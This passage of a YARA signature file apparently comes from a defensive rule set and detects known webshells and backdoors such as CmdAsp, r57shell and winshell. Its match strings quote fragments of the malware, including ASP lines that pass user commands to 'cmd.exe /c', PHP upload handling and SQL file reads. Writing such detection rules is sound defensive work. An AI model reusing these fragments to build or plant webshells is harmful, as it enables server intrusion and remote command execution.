		$s1 = "DA!OLUTELY N"
	condition:
		all of them
}
rule RkNTLoad {
	meta:
		description = "Webshells Auto-generated - file RkNTLoad.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "262317c95ced56224f136ba532b8b34f"
		id = "fd4b1343-5fa9-5ad8-bee1-6b06b93ddfbe"
	strings:
		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s2 = "5pur+virtu!"
		$s3 = "ugh spac#n"
		$s4 = "xcEx3WriL4"
		$s5 = "runtime error"
		$s6 = "loseHWait.Sr."
		$s7 = "essageBoxAw"
		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"
	condition:
		all of them
}
rule binder2_binder2 {
	meta:
		description = "Webshells Auto-generated - file binder2.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d594e90ad23ae0bc0b65b59189c12f11"
		id = "29269dc0-f2e4-56ec-ad64-0dff00e339b7"
	strings:
		$s0 = "IsCharAlphaNumericA"
		$s2 = "WideCharToM"
		$s4 = "g 5pur+virtu!"
		$s5 = "\\syslog.en"
		$s6 = "heap7'7oqk?not="
		$s8 = "- Kablto in"
	condition:
		all of them
}
rule thelast_orice2 {
	meta:
		description = "Webshells Auto-generated - file orice2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "aa63ffb27bde8d03d00dda04421237ae"
		id = "968cef9e-0163-5f4a-91e3-07510f9f4fcd"
	strings:
		$s0 = " $aa = $_GET['aa'];"
		$s1 = "echo $aa;"
	condition:
		all of them
}
rule FSO_s_sincap {
	meta:
		description = "Webshells Auto-generated - file sincap.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
		id = "fcee20a3-e71b-5f69-ac67-8660fd270703"
	strings:
		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="
	condition:
		all of them
}
rule PhpShell {
	meta:
		description = "Webshells Auto-generated - file PhpShell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "539baa0d39a9cf3c64d65ee7a8738620"
		id = "887264d3-5704-5e38-b0a6-44d529258ea2"
	strings:
		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."
	condition:
		all of them
}
rule HYTop_DevPack_config {
	meta:
		description = "Webshells Auto-generated - file config.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b41d0e64e64a685178a3155195921d61"
		id = "da1b8ce1-8b17-53f6-a86b-ad3fe918084e"
	strings:
		$s0 = "const adminPassword=\""
		$s2 = "const userPassword=\""
		$s3 = "const mVersion="
	condition:
		all of them
}
rule sendmail {
	meta:
		description = "Webshells Auto-generated - file sendmail.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "75b86f4a21d8adefaf34b3a94629bd17"
		id = "dd33c2bb-61bf-57b7-82b9-d864097f7a56"
	strings:
		$s3 = "_NextPyC808"
		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"
	condition:
		all of them
}
rule FSO_s_zehir4 {
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		id = "9f1adcd6-b721-54ef-a20f-c3a353629a40"
	strings:
		$s5 = " byMesaj "
	condition:
		all of them
}
rule hkshell_hkshell {
	meta:
		description = "Webshells Auto-generated - file hkshell.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "168cab58cee59dc4706b3be988312580"
		id = "7436cd7c-7027-56dc-bb62-fac0f70c27d8"
	strings:
		$s1 = "PrSessKERNELU"
		$s2 = "Cur3ntV7sion"
		$s3 = "Explorer8"
	condition:
		all of them
}
rule iMHaPFtp {
	meta:
		description = "Webshells Auto-generated - file iMHaPFtp.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "12911b73bc6a5d313b494102abcf5c57"
		id = "c810c630-ce08-5059-ad49-f65b244f4d19"
	strings:
		$s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"
	condition:
		all of them
}
rule Unpack_TBack {
	meta:
		description = "Webshells Auto-generated - file TBack.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a9d1007823bf96fb163ab38726b48464"
		id = "b5f93621-e1e9-5aed-b574-471b4c1f9570"
	strings:
		$s5 = "\\final\\new\\lcc\\public.dll"
	condition:
		all of them
}
rule DarkSpy105 {
	meta:
		description = "Webshells Auto-generated - file DarkSpy105.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
		id = "9d519ccf-fe52-5b82-a39d-c9f86c1089e1"
	strings:
		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"
	condition:
		all of them
}
rule EditServer_EXE {
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "f945de25e0eba3bdaf1455b3a62b9832"
		id = "97928144-0112-5288-8f95-acf7a0d56e71"
	strings:
		$s2 = "Server %s Have Been Configured"
		$s5 = "The Server Password Exceeds 32 Characters"
		$s8 = "9--Set Procecess Name To Inject DLL"
	condition:
		all of them
}
rule FSO_s_reader {
	meta:
		description = "Webshells Auto-generated - file reader.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
		id = "d596f7f4-5b0d-5f17-94d3-2582ec041eb1"
	strings:
		$s2 = "mailto:mailbomb@hotmail."
	condition:
		all of them
}
rule ASP_CmdAsp {
	meta:
		description = "Webshells Auto-generated - file CmdAsp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
		id = "e4b48843-1936-5717-b2b6-add5b4a14d04"
	strings:
		$s2 = "' -- Read the output from our command and remove the temp file -- '"
		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
		$s9 = "' -- create the COM objects that we will be using -- '"
	condition:
		all of them
}
rule KA_uShell {
	meta:
		description = "Webshells Auto-generated - file KA_uShell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "685f5d4f7f6751eaefc2695071569aab"
		id = "34e220db-2fb5-59dc-b5e8-d88f844d3977"
	strings:
		$s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
		$s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
	condition:
		all of them
}
rule PHP_Backdoor_v1 {
	meta:
		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "0506ba90759d11d78befd21cabf41f3d"
		id = "f47298a9-a47c-5088-ab1f-1bd76bfd0ca8"
	strings:

		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"
	condition:
		all of them
}
rule svchostdll {
	meta:
		description = "Webshells Auto-generated - file svchostdll.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "0f6756c8cb0b454c452055f189e4c3f4"
		id = "b369d702-1f29-56ec-a742-f87d9c42c775"
	strings:
		$s0 = "InstallService"
		$s1 = "RundllInstallA"
		$s2 = "UninstallService"
		$s3 = "&G3 Users In RegistryD"
		$s4 = "OL_SHUTDOWN;I"
		$s5 = "SvcHostDLL.dll"
		$s6 = "RundllUninstallA"
		$s7 = "InternetOpenA"
		$s8 = "Check Cloneomplete"
	condition:
		all of them
}
rule HYTop_DevPack_server {
	meta:
		description = "Webshells Auto-generated - file server.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1d38526a215df13c7373da4635541b43"
		id = "0e4fee1b-8a16-5738-9600-fa965f8c84c2"
	strings:
		$s0 = "<!-- PageServer Below -->"
	condition:
		all of them
}
rule vanquish {
	meta:
		description = "Webshells Auto-generated - file vanquish.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "684450adde37a93e8bb362994efc898c"
		id = "143e5e46-ffbc-5aee-9f9b-13374a6c3c10"
	strings:
		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"
	condition:
		all of them
}
rule winshell {
	meta:
		description = "Webshells Auto-generated - file winshell.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3144410a37dd4c29d004a814a294ea26"
		id = "24edd03a-df71-5d84-9764-ba7903b68064"
	strings:
		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
		$s1 = "WinShell Service"
		$s2 = "__GLOBAL_HEAP_SELECTED"
		$s3 = "__MSVCRT_HEAP_SELECT"
		$s4 = "Provide Windows CmdShell Service"
		$s5 = "URLDownloadToFileA"
		$s6 = "RegisterServiceProcess"
		$s7 = "GetModuleBaseNameA"
		$s8 = "WinShell v5.0 (C)2002 janker.org"
	condition:
		all of them
}
rule FSO_s_remview {
	meta:
		description = "Webshells Auto-generated - file remview.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		id = "5040ddbc-2e61-50ca-b738-a4ac8feec3f1"
	strings:
		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"
	condition:
		all of them
}
rule saphpshell {
	meta:
		description = "Webshells Auto-generated - file saphpshell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d7bba8def713512ddda14baf9cd6889a"
		id = "42bcd739-714e-5dbf-a3a1-929f3d16ed6f"
	strings:
		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"
	condition:
		all of them
}
rule HYTop2006_rar_Folder_2006Z {
	meta:
		description = "Webshells Auto-generated - file 2006Z.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "fd1b6129abd4ab177fed135e3b665488"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
	strings:
		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"
	condition:
		all of them
}
rule admin_ad {
	meta:
		description = "Webshells Auto-generated - file admin-ad.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
		id = "7d87b4f6-3227-53cb-803c-4f9c7327f203"
	strings:
		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"
	condition:
		all of them
}
rule FSO_s_casus15 {
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		id = "305842e4-26ad-573d-8df3-e32e239e434b"
	strings:
		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"
	condition:
		all of them
}
rule BIN_Client {
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
		id = "515ab1b3-7923-55de-8c19-71ef5d9b4366"
	strings:
		$s0 = "=====Remote Shell Closed====="
		$s2 = "All Files(*.*)|*.*||"
		$s6 = "WSAStartup Error!"
		$s7 = "SHGetFileInfoA"
		$s8 = "CreateThread False!"
		$s9 = "Port Number Error"
	condition:
		4 of them
}
rule shelltools_g0t_root_uptime {
	meta:
		description = "Webshells Auto-generated - file uptime.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
		id = "4f649757-9502-5640-bc17-11cad6c779f4"
	strings:
		$s0 = "JDiamondCSlC~"
		$s1 = "CharactQA"
		$s2 = "$Info: This file is packed with the UPX executable packer $"
		$s5 = "HandlereateConso"
		$s7 = "ION\\System\\FloatingPo"
	condition:
		all of them
}
rule Simple_PHP_BackDooR {
	meta:
		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a401132363eecc3a1040774bec9cb24f"
		id = "bd7c19b9-e035-5e70-b626-1d210cadc055"
	strings:
		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
		$s9 = "// a simple php backdoor"
	condition:
		1 of them
}
rule sig_2005Gray {
	meta:
		description = "Webshells Auto-generated - file 2005Gray.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
		id = "978fb04e-517d-51cf-98ca-5fd6b421365e"
	strings:
		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"
	condition:
		all of them
}
rule DllInjection {
	meta:
		description = "Webshells Auto-generated - file DllInjection.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a7b92283a5102886ab8aee2bc5c8d718"
		id = "8a57e122-fd00-57f3-94db-736c5bfd76db"
	strings:
		$s0 = "\\BDoor\\DllInjecti"
	condition:
		all of them
}
rule Mithril_v1_45_Mithril {
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "f1484f882dc381dde6eaa0b80ef64a07"
		id = "3c160017-0332-532a-bb7f-390a4a34dc4e"
	strings:
		$s2 = "cress.exe"
		$s7 = "\\Debug\\Mithril."
	condition:
		all of them
}
rule hkshell_hkrmv {
	meta:
		description = "Webshells Auto-generated - file hkrmv.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
		id = "986fad12-9198-5e0a-88d6-a9be6963ff8c"
	strings:
		$s5 = "/THUMBPOSITION7"
		$s6 = "\\EvilBlade\\"
	condition:
		all of them
}
rule WEBSHELL_PHP_1 {
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		old_rule_name = "phpshell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1dccb1ea9f24ffbd085571c88585517b"
		id = "d0107af3-e484-54cf-a238-dd1e71efd3f6"
	strings:
		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "
	condition:
		all of them
}
rule FSO_s_cmd {
	meta:
		description = "Webshells Auto-generated - file cmd.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
		id = "f7a74f21-aec9-5ee7-a80e-0fe34b977a71"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_phpft {
	meta:
		description = "Webshells Auto-generated - file phpft.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "60ef80175fcc6a879ca57c54226646b1"
		id = "00bc690b-4977-5076-a40a-edd39c37233f"
	strings:
		$s6 = "PHP Files Thief"
		$s11 = "http://www.4ngel.net"
	condition:
		all of them
}
rule FSO_s_indexer {
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "135fc50f85228691b401848caef3be9e"
		id = "fba053d7-5413-563f-8c27-0554349500b2"
	strings:
		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"
	condition:
		all of them
}
rule r57shell {
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
	strings:
		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"
	condition:
		all of them
}
rule bdcli100 {
	meta:
		description = "Webshells Auto-generated - file bdcli100.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b12163ac53789fb4f62e4f17a8c2e028"
		id = "c74e8822-9556-5596-a130-c6e0120d7103"
	strings:
		$s5 = "unable to connect to "
		$s8 = "backdoor is corrupted on "
	condition:
		all of them
}
rule HYTop_DevPack_2005Red {
	meta:
		description = "Webshells Auto-generated - file 2005Red.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
	strings:
		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
	condition:
		all of them
}
rule HYTop2006_rar_Folder_2006X2 {
	meta:
		description = "Webshells Auto-generated - file 2006X2.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cc5bf9fc56d404ebbc492855393d7620"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
	strings:
		$s2 = "Powered By "
		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."
	condition:
		all of them
}
rule rdrbs084 {
	meta:
		description = "Webshells Auto-generated - file rdrbs084.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "ed30327b255816bdd7590bf891aa0020"
		id = "97548273-6894-5c9f-8cca-d966ce770ada"
	strings:
		$s0 = "Create mapped port. You have to specify domain when using HTTP type."
		$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"
	condition:
		all of them
}
rule HYTop_CaseSwitch_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8bf667ee9e21366bc0bd3491cb614f41"
		id = "0f2b8e71-1c11-5efe-bee7-146168aec369"
	strings:
		$s1 = "MSComDlg.CommonDialog"
		$s2 = "CommonDialog1"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s5 = "EVENT_SINK_AddRef"
		$s6 = "By Marcos"
		$s7 = "EVENT_SINK_QueryInterface"
		$s8 = "MethCallEngine"
	condition:
		all of them
}
rule eBayId_index3 {
	meta:
		description = "Webshells Auto-generated - file index3.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "0412b1e37f41ea0d002e4ed11608905f"
		id = "4fc30150-7b44-53c4-888c-faf651495407"
	strings:
		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"
	condition:
		all of them
}
rule FSO_s_phvayv {
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "205ecda66c443083403efb1e5c7f7878"
		id = "07e027a6-01a5-5250-a35e-fbfef1449cfe"
	strings:
		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"
	condition:
		all of them
}
rule byshell063_ntboot {
	meta:
		description = "Webshells Auto-generated - file ntboot.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
		id = "7d1f39f6-04f1-51ee-b125-c35af8ae4c0c"
	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "Dumping Description to Registry..."
		$s3 = "Opening Service .... Failure !"
	condition:
		all of them
}
rule FSO_s_casus15_2 {
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		id = "d3f67fe9-a93f-504a-8b14-a815135d562f"
	strings:
		$s0 = "copy ( $dosya_gonder"
	condition:
		all of them
}
rule installer {
	meta:
		description = "Webshells Auto-generated - file installer.cmd"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a507919ae701cf7e42fa441d3ad95f8f"
		id = "681d8284-55e5-5316-a0d2-f4f13218df76"
	strings:
		$s0 = "Restore Old Vanquish"
		$s4 = "ReInstall Vanquish"
	condition:
		all of them
}
rule FSO_s_remview_2 {
	meta:
		description = "Webshells Auto-generated - file remview.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		id = "8e0492e8-d683-5c2d-b1ce-6c8344b874af"
	strings:
		$s0 = "<xmp>$out</"
		$s1 = ".mm(\"Eval PHP code\")."
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_r57 {
	meta:
		description = "Webshells Auto-generated - file r57.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "903908b77a266b855262cdbce81c3f72"
		id = "14092413-27a4-5b7d-9023-0b53b3d45a12"
	strings:
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."
	condition:
		all of them
}
rule HYTop2006_rar_Folder_2006X {
	meta:
		description = "Webshells Auto-generated - file 2006X.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
	strings:
		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""
	condition:
		all of them
}
rule FSO_s_phvayv_2 {
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "205ecda66c443083403efb1e5c7f7878"
		id = "8bd52f9b-a232-566d-90ab-4085933cdc65"
	strings:
		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"
	condition:
		all of them
}
rule elmaliseker {
	meta:
		description = "Webshells Auto-generated - file elmaliseker.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "ccf48af0c8c09bbd038e610a49c9862e"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
	strings:
		$s0 = "javascript:Command('Download'"
		$s5 = "zombie_array=array("
	condition:
		all of them
}
rule shelltools_g0t_root_resolve {
	meta:
		description = "Webshells Auto-generated - file resolve.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "69bf9aa296238610a0e05f99b5540297"
		id = "dcdb9952-63fc-57a7-ae17-ffe8ac4271f1"
	strings:
		$s0 = "3^n6B(Ed3"
		$s1 = "^uldn'Vt(x"
		$s2 = "\\= uPKfp"
		$s3 = "'r.axV<ad"
		$s4 = "p,modoi$=sr("
		$s5 = "DiamondC8S t"
		$s6 = "`lQ9fX<ZvJW"
	condition:
		all of them
}
rule FSO_s_RemExp {
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		id = "48a262bf-7f48-5ed9-b043-80e9d563bf21"
	strings:
		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"
